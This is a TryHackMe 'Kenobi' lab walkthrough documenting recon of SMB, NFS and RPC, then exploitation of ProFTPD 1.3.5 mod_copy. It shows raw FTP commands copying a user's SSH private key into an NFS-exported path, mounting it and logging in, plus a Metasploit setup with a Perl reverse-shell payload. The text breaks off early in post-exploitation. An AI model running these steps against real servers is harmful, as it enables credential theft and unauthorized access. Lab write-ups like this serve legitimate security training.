# TryHackMe-Kenobi-Methodology
**Platform:** TryHackMe
**Difficulty:** Easy
**OS:** Linux
**Skills demonstrated:** Samba/NFS/RPC enumeration, anonymous FTP/SMB access, ProFTPD `mod_copy` exploitation, SSH key retrieval, SUID/PATH hijacking privilege escalation

---

## 1. Objective

Document the full compromise path of the Kenobi machine, following a standard methodology: **Recon → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation**. This room emphasizes service enumeration across multiple protocols (SMB, FTP, NFS, RPC) rather than a single flashy exploit.

---

## 2. Reconnaissance

### 2.1 Port Scanning

```bash
nmap -sV -sC -p- -oN scans/full.nmap 10.130.162.80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-24 13:20 UTC
Nmap scan report for ip-10-130-162-80.eu-west-3.compute.internal (10.130.162.80)
Host is up (0.0013s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9c:37:1e:5a:17:b2:53:91:f8:ec:64:dd:00:4f:33:24 (RSA)
|   256 52:1b:f0:d4:94:f7:fe:29:02:7e:bf:01:0c:f2:89:00 (ECDSA)
|_  256 a0:68:4e:74:12:fe:39:e7:95:84:a6:0f:5c:ef:3d:7a (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36843/tcp   mountd
|   100005  1,2,3      41103/tcp6  mountd
|   100005  1,2,3      51047/udp   mountd
|   100005  1,2,3      52443/udp6  mountd
|   100021  1,3,4      37029/tcp   nlockmgr
|   100021  1,3,4      40323/tcp6  nlockmgr
|   100021  1,3,4      42299/udp   nlockmgr
|   100021  1,3,4      46350/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs         3-4 (RPC #100003)
MAC Address: 0E:45:42:A0:AC:EF (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-24T13:20:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

**Findings (typical for this box):**

| Port | Service | Notes |
| --- | --- | --- |
| 21 | FTP | ProFTPD 1.3.5 |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Static splash page |
| 111 | RPCbind | Maps RPC program numbers to ports |
| 139/445 | SMB (Samba) | Multiple shares exposed |
| 2049 | NFS | Exported mount |

Multiple services being exposed simultaneously is a strong hint that the intended path chains information across more than one protocol.

---

## 3. Enumeration

### 3.1 Samba (SMB) Enumeration

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Enumerate available shares and users with SMB scripts:

```bash
ls -al /usr/share/nmap/scripts | grep smb
-rw-r--r-- 1 root root  3753 Apr  9 05:18 smb2-capabilities.nse
-rw-r--r-- 1 root root  2689 Apr  9 05:18 smb2-security-mode.nse
-rw-r--r-- 1 root root  1408 Apr  9 05:18 smb2-time.nse
-rw-r--r-- 1 root root  5269 Apr  9 05:18 smb2-vuln-uptime.nse
-rw-r--r-- 1 root root 45061 Apr  9 05:18 smb-brute.nse
-rw-r--r-- 1 root root  5289 Apr  9 05:18 smb-double-pulsar-backdoor.nse
-rw-r--r-- 1 root root  4840 Apr  9 05:18 smb-enum-domains.nse
-rw-r--r-- 1 root root  5971 Apr  9 05:18 smb-enum-groups.nse
-rw-r--r-- 1 root root  8043 Apr  9 05:18 smb-enum-processes.nse
-rw-r--r-- 1 root root 27274 Apr  9 05:18 smb-enum-services.nse
-rw-r--r-- 1 root root 12017 Apr  9 05:18 smb-enum-sessions.nse
-rw-r--r-- 1 root root  6923 Apr  9 05:18 smb-enum-shares.nse
-rw-r--r-- 1 root root 12527 Apr  9 05:18 smb-enum-users.nse
-rw-r--r-- 1 root root  4418 Apr  9 05:18 smb-flood.nse
-rw-r--r-- 1 root root  7471 Apr  9 05:18 smb-ls.nse
-rw-r--r-- 1 root root  8758 Apr  9 05:18 smb-mbenum.nse
-rw-r--r-- 1 root root  8220 Apr  9 05:18 smb-os-discovery.nse
-rw-r--r-- 1 root root  4982 Apr  9 05:18 smb-print-text.nse
-rw-r--r-- 1 root root  1833 Apr  9 05:18 smb-protocols.nse
-rw-r--r-- 1 root root 63596 Apr  9 05:18 smb-psexec.nse
-rw-r--r-- 1 root root  5190 Apr  9 05:18 smb-security-mode.nse
-rw-r--r-- 1 root root  2424 Apr  9 05:18 smb-server-stats.nse
-rw-r--r-- 1 root root 14159 Apr  9 05:18 smb-system-info.nse
-rw-r--r-- 1 root root  7524 Apr  9 05:18 smb-vuln-conficker.nse
-rw-r--r-- 1 root root  6402 Apr  9 05:18 smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 23154 Apr  9 05:18 smb-vuln-cve-2017-7494.nse
-rw-r--r-- 1 root root  6545 Apr  9 05:18 smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root  5386 Apr  9 05:18 smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root  5688 Apr  9 05:18 smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root  5647 Apr  9 05:18 smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root  7214 Apr  9 05:18 smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root  7344 Apr  9 05:18 smb-vuln-ms17-010.nse
-rw-r--r-- 1 root root  4400 Apr  9 05:18 smb-vuln-regsvc-dos.nse
-rw-r--r-- 1 root root  6586 Apr  9 05:18 smb-vuln-webexec.nse
-rw-r--r-- 1 root root  5084 Apr  9 05:18 smb-webexec-exploit.nse
```

```bash
enum4linux -a 10.130.162.80
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 24 10:08:19 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                                             
Target ........... 10.130.162.80                                                                                                                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 10.130.162.80 )===========================
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                     
                                                                                                                                                                                             
                                                                                                                                                                                             
 ===============================( Nbtstat Information for 10.130.162.80 )===============================
                                                                                                                                                                                             
Looking up status of 10.130.162.80                                                                                                                                                           
        KENOBI          <00> -         B <ACTIVE>  Workstation Service
        KENOBI          <03> -         B <ACTIVE>  Messenger Service
        KENOBI          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.130.162.80 )===================================
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Server 10.130.162.80 allows sessions using username '', password ''                                                                                                                      
                                                                                                                                                                                             
                                                                                                                                                                                             
 ================================( Getting domain SID for 10.130.162.80 )================================
                                                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
 ==================================( OS information on 10.130.162.80 )==================================
                                                                                                                                                                                             
                                                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
[+] Got OS info for 10.130.162.80 from srvinfo:                                                                                                                                              
        KENOBI         Wk Sv PrQ Unx NT SNT kenobi server (Samba, Ubuntu)                                                                                                                    
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =======================================( Users on 10.130.162.80 )=======================================
                                                                                                                                                                                             
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                      
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.130.162.80 )=================================
                                                                                                                                                                                             
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                        

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.130.162.80 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.130.162.80                                                                                                                                                
                                                                                                                                                                                             
//10.130.162.80/print$  Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                            
//10.130.162.80/anonymous       Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                                                                                                               
                                                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                   
//10.130.162.80/IPC$    Mapping: N/A Listing: N/A Writing: N/A

```

This surfaces multiple shares, including one accessible without credentials. Connect to it directly:

```bash
smbclient //10.130.162.80/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Sat Aug  9 09:03:22 2025
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9183416 blocks of size 1024. 2991508 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
smb: \> ^Z
zsh: suspended  smbclient //10.130.162.80/anonymous

```

Listing the share reveals a `log.txt` file. Downloading and reading it discloses the FTP port/service in use — corroborating what was already seen in the nmap scan and hinting at the next pivot point.

```bash
cat log.txt 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            kenobi
Group                           kenobi

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite          on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User                          ftp
  Group                         ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients                    10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin                  welcome.msg
  DisplayChdir                  .message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You should read the
# smb.conf(5) manual page in order to understand the options listed
# here. Samba has a huge number of configurable options most of which 
# are not shown in this example
#
# Some options that are often worth tuning have been included as
# commented-out examples in this file.
#  - When such options are commented with ";", the proposed setting
#    differs from the default Samba behaviour
#  - When commented with "#", the proposed setting is the default
#    behaviour of Samba but the option is considered important
#    enough to be mentioned here
#
# NOTE: Whenever you modify this file you should run the command
# "testparm" to check that you have not made any basic syntactic 
# errors. 

#======================= Global Settings =======================

[global]

## Browsing/Identification ###

# Change this to the workgroup/NT-domain name your Samba server will part of
   workgroup = WORKGROUP

# server string is the equivalent of the NT Description field
        server string = %h server (Samba, Ubuntu)

# Windows Internet Name Serving Support Section:
# WINS Support - Tells the NMBD component of Samba to enable its WINS Server
#   wins support = no

# WINS Server - Tells the NMBD components of Samba to be a WINS Client
# Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
;   wins server = w.x.y.z

# This will prevent nmbd to search for NetBIOS names through DNS.
   dns proxy = no

#### Networking ####

# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 eth0

# Only bind to the named interfaces and/or networks; you must use the
# 'interfaces' option above to use this.
# It is recommended that you enable this feature if your Samba machine is
# not protected by a firewall or is a firewall itself.  However, this
# option cannot handle dynamic or non-broadcast interfaces correctly.
;   bind interfaces only = yes

#### Debugging/Accounting ####

# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m

# Cap the size of the individual log files (in KiB).
   max log size = 1000

# If you want Samba to only log through syslog then set the following
# parameter to 'yes'.
#   syslog only = no

# We want Samba to log a minimum amount of information to syslog. Everything
# should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
# through syslog you should set the following parameter to something higher.
   syslog = 0

# Do something sensible when Samba crashes: mail the admin a backtrace
   panic action = /usr/share/samba/panic-action %d

####### Authentication #######

# Server role. Defines in which mode Samba will operate. Possible
# values are "standalone server", "member server", "classic primary
# domain controller", "classic backup domain controller", "active
# directory domain controller". 
#
# Most people will want "standalone sever" or "member server".
# Running as "active directory domain controller" will require first
# running "samba-tool domain provision" to wipe databases and create a
# new domain.
   server role = standalone server

# If you are using encrypted passwords, Samba will need to know what
# password database type you are using.  
   passdb backend = tdbsam

   obey pam restrictions = yes

# This boolean parameter controls whether Samba attempts to sync the Unix
# password with the SMB password when the encrypted SMB password in the
# passdb is changed.
   unix password sync = yes

# For Unix password sync to work on a Debian GNU/Linux system, the following
# parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
# sending the correct chat script for the passwd program in Debian Sarge).
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

# This boolean controls whether PAM will be used for password changes
# when requested by an SMB client instead of the program listed in
# 'passwd program'. The default is 'no'.
   pam password change = yes

# This option controls how unsuccessful authentication attempts are mapped
# to anonymous connections
   map to guest = bad user

########## Domains ###########

#
# The following settings only takes effect if 'server role = primary
# classic domain controller', 'server role = backup domain controller'
# or 'domain logons' is set 
#

# It specifies the location of the user's
# profile directory from the client point of view) The following
# required a [profiles] share to be setup on the samba server (see
# below)
;   logon path = \\%N\profiles\%U
# Another common choice is storing the profile in the user's home directory
# (this is Samba's default)
#   logon path = \\%N\%U\profile

# The following setting only takes effect if 'domain logons' is set
# It specifies the location of a user's home directory (from the client
# point of view)
;   logon drive = H:
#   logon home = \\%N\%U

# The following setting only takes effect if 'domain logons' is set
# It specifies the script to run during logon. The script must be stored
# in the [netlogon] share
# NOTE: Must be store in 'DOS' file format convention
;   logon script = logon.cmd

# This allows Unix users to be created on the domain controller via the SAMR
# RPC pipe.  The example command creates a user account with a disabled Unix
# password; please adapt to your needs
; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u

# This allows machine accounts to be created on the domain controller via the 
# SAMR RPC pipe.  
# The following assumes a "machines" group exists on the system
; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u

# This allows Unix groups to be created on the domain controller via the SAMR
# RPC pipe.  
; add group script = /usr/sbin/addgroup --force-badname %g

############ Misc ############

# Using the following line enables you to customise your configuration
# on a per machine basis. The %m gets replaced with the netbios name
# of the machine that is connecting
;   include = /home/samba/etc/smb.conf.%m

# Some defaults for winbind (make sure you're not using the ranges
# for something else.)
;   idmap uid = 10000-20000
;   idmap gid = 10000-20000
;   template shell = /bin/bash

# Setup usershare options to enable non-root users to share folders
# with the net usershare command.

# Maximum number of usershare. 0 (default) means that usershare is disabled.
;   usershare max shares = 100

# Allow users who've been granted usershare privileges to create
# public shares, not just authenticated ones
   usershare allow guests = yes

#======================= Share Definitions =======================

# Un-comment the following (and tweak the other settings below to suit)
# to enable the default home directory shares. This will share each
# user's home directory as \\server\username
;[homes]
;   comment = Home Directories
;   browseable = no

# By default, the home directories are exported read-only. Change the
# next parameter to 'no' if you want to be able to write to them.
;   read only = yes

# File creation mask is set to 0700 for security reasons. If you want to
# create files with group=rw permissions, set next parameter to 0775.
;   create mask = 0700

# Directory creation mask is set to 0700 for security reasons. If you want to
# create dirs. with group=rw permissions, set next parameter to 0775.
;   directory mask = 0700

# By default, \\server\username shares can be connected to by anyone
# with access to the samba server.
# Un-comment the following parameter to make sure that only "username"
# can connect to \\server\username
# This might need tweaking when using external authentication schemes
;   valid users = %S

# Un-comment the following and create the netlogon directory for Domain Logons
# (you need to configure Samba to act as a domain controller too.)
;[netlogon]
;   comment = Network Logon Service
;   path = /home/samba/netlogon
;   guest ok = yes
;   read only = yes

# Un-comment the following and create the profiles directory to store
# users profiles (see the "logon path" option above)
# (you need to configure Samba to act as a domain controller too.)
# The path below should be writable by all users so that their
# profile directory may be created the first time they log on
;[profiles]
;   comment = Users profiles
;   path = /home/samba/profiles
;   guest ok = no
;   browseable = no
;   create mask = 0600
;   directory mask = 0700

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
# Uncomment to allow remote administration of Windows print drivers.
# You may need to replace 'lpadmin' with the name of the group your
# admin users are members of.
# Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
;   write list = root, @lpadmin
[anonymous]
   path = /home/kenobi/share
   browseable = yes
   read only = yes
   guest ok = yes

```

!image.png

### 3.2 NFS Enumeration

RPCbind on port 111 indicates NFS is likely in play. Enumerate exports:

```bash
sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.130.162.80     
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 10:30 -0400
Nmap scan report for 10.130.162.80
Host is up (0.15s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| ??????????  ?    ?    ?     ?                    ..
| rwxr-xr-x   0    0    4096  2026-07-24T13:30:57  backups
| rwxr-xr-x   0    0    4096  2025-08-10T06:48:58  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2026-07-24T13:15:53  log
| rwxr-xr-x   0    0    4096  2025-08-09T13:38:21  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9183416.0  5701316.0  2991504.0  66%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
```

This reveals a `/var` mount exported over NFS — worth noting for later, since files dropped there may be readable/writable from the target's perspective (e.g., useful for planting a payload the ProFTPD/webroot process picks up, depending on export permissions).

### 3.3 Service Version Fingerprinting

The nmap service scan already identified **ProFTPD 1.3.5** on port 21. This specific version is the actual point of entry.

---

## 4. Initial Foothold — ProFTPD `mod_copy` Exploitation

### 4.1 Identifying the Vulnerability

Search for known exploits against the fingerprinted version:

```bash
searchsploit proftpd 1.3.5                                               
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                 | linux/remote/36742.txt
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

ProFTPD 1.3.5 is vulnerable to a `mod_copy` module flaw that allows unauthenticated `SITE CPFR` / `SITE CPTO` FTP commands to copy files **server-side** without needing valid FTP credentials — effectively an arbitrary file copy primitive.

```bash
nc 10.130.144.24 21      
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.130.144.24]
dir
500 DIR not understood
ls
500 LS not understood
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Mount the /var/tmp directory to our machine

```bash
sudo mkdir /mnt/kenobiNFS                           
[sudo] password for kali: 
mkdir: cannot create directory ‘/mnt/kenobiNFS’: File exists
$ sudo mount 10.130.144.24:/var /mnt/kenobiNFS
$ ls -la /mnt/kenobiNFS/   
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 root root  4096 Jul 24 11:04 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x 15 root root  4096 Aug 10  2025 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 51 root root  4096 Aug 10  2025 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root avahi 4096 Jul 25 06:28 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root  4096 Aug  9  2025 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  8 root root  4096 Jul 25 06:34 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

```bash
$ sudo cp /mnt/kenobiNFS/tmp/id_rsa .
$ sudo chmod 600 id_rsa 
$ sudo ssh -i id_rsa kenobi@10.130.144.24
The authenticity of host '10.130.144.24 (10.130.144.24)' can't be established.
ED25519 key fingerprint is: SHA256:eFBvmf2cEh3SQE1dw4XJp9CITdkt5IZJhcdaVArkT4o
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.130.144.24' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 25 Jul 2026 05:55:56 AM CDT

  System load:  0.0               Processes:             121
  Usage of /:   62.2% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.130.144.24
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```

### 4.2 Exploiting via Metasploit

```bash
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS <TARGET_IP>
set SITEPATH /var/www/html
set PAYLOAD cmd/unix/reverse_perl
run
```

This module uses the `SITE CPFR`/`SITE CPTO` commands to copy a malicious payload into the web root, then triggers it via an HTTP request to gain command execution.

### 4.3 Manual Exploitation (Alternative)

Without Metasploit, the same primitive can be triggered manually via raw FTP commands to copy `/etc/passwd`-style files or, more usefully, to copy the target's SSH private key out of a readable location (a well-known escalation path on this box, since the `kenobi` user's SSH key is world-readable under `/home/kenobi/.ssh/`):

```bash
ftp <TARGET_IP>
site cpfr /home/kenobi/.ssh/id_rsa
site cpto /var/tmp/id_rsa
```

Then retrieve the copied key via the anonymous FTP or SMB share (depending on where it was staged), set correct permissions locally, and authenticate directly over SSH:

```bash
$ sudo chmod 600 id_rsa 
$ sudo ssh -i id_rsa kenobi@10.130.144.24
The authenticity of host '10.130.144.24 (10.130.144.24)' can't be established.
ED25519 key fingerprint is: SHA256:eFBvmf2cEh3SQE1dw4XJp9CITdkt5IZJhcdaVArkT4o
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.130.144.24' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 25 Jul 2026 05:55:56 AM CDT

  System load:  0.0               Processes:             121
  Usage of /:   62.2% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.130.144.24
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 
```

```bash
or

kenobi@kenobi:~$ whoami
kenobi
kenobi@kenobi:~$ pwd
/home/kenobi
kenobi@kenobi:~$ ls -la
total 40
drwxr-xr-x 5 kenobi kenobi 4096 Aug  9  2025 .
drwxr-xr-x 4 root   root   4096 Aug 10  2025 ..
lrwxrwxrwx 1 root   root      9 Sep  4  2019 .bash_history -> /dev/null
-rw-r--r-- 1 kenobi kenobi  220 Sep  4  2019 .bash_logout
